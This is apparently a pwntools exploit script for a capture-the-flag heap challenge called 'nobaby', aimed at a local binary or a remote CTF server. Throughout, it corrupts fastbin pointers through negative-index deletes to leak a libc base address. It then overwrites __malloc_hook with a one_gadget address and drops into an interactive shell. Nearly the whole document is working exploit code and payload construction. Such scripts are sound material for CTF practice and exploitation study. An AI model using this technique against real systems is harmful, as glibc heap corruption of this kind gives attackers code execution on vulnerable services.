# This exploit only work on local because at remote, libc file is f**king "kham'"

from pwn import *

local = True

if local:
	r = process("./nobaby")
	gadget = 0xf02a4
	stdout_off = 0x3c5620
	malloc_hook_off = 0x3c4b10
else:
	# nc 103.237.99.35 28994
	r = remote("103.237.99.35", 28994)
	gadget = 0xe9415
	stdout_off = 0x3c3400
	malloc_hook_off = 0x3c2740

def add(content):
	r.sendline("1")
	r.recvuntil("Content:")
	r.send(content)
	r.recvuntil("Your choice:")

def show(index):
	r.sendline("2")
	r.recvuntil("Index:")
	r.sendline(str(index))
	result = r.recvuntil("Your choice:")
	return result
def delete(index):
	r.sendline("3")
	r.recvuntil("Index:")
	r.sendline(str(index))
	r.recvuntil("Your choice:")


exit_got = 0x601ff8

ptr = 0x602060
count = 0x6020b0

r.recvuntil("Name:")
r.send("\n")
r.recvuntil("Your choice:")


for i in range(10):
	add("1")
for i in range(10):
	delete(-1)
add("1")

for i in range(0x71-4):
	delete(-1)

delete(0)
delete(1)
delete(9)
delete(8)
delete(10)

payload = p64(exit_got + 5 - 8)

add(payload)
add("anything")
add("anything")
payload = "b"*3*8 + "aaa"
add(payload)

result = show(9)
result = result.split("aaa")[1][:6] + "\x00\x00"
libc_base = u64(result) - stdout_off 

print "Libc_base: " + hex(libc_base)
malloc_hook = libc_base + malloc_hook_off

for i in range(3):
	delete(-1)

# overwrite count global variable
add("abcd")

for i in range(0xe1-5):
	delete(-1)

delete(0)
delete(1)
delete(2)
delete(8)
delete(7)
delete(10)

payload = p64(malloc_hook - 0x20 + 5 - 8)

add(payload)
add("anything")

add("anything")

payload = "\x00"*0x13 + p64(libc_base + gadget)

add(payload)

#add("Trigger one_gadget")
r.sendline("1")

r.interactive()